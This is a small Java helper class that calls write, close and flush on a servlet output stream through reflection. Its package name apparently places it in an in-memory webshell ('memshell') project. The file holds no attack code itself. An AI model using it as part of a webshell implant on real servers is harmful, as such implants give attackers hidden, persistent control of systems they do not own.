package net.rebeyond.memshell.redefine;

public class MyServletOutputStream {
	public static void write(Object servletOutputStream ,byte[] a,int b,int c) throws Exception
	{
		servletOutputStream.getClass().getMethod("write", byte[].class,int.class,int.class).invoke(servletOutputStream, a,b,c);
	}
	
	public static void close(Object servletOutputStream ) throws Exception
	{
		servletOutputStream.getClass().getMethod("close",null).invoke(servletOutputStream,new Object[] {});
	}
	
	public static void flush(Object servletOutputStream ) throws Exception
	{
		servletOutputStream.getClass().getMethod("flush",null).invoke(servletOutputStream,new Object[] {});
	}
}
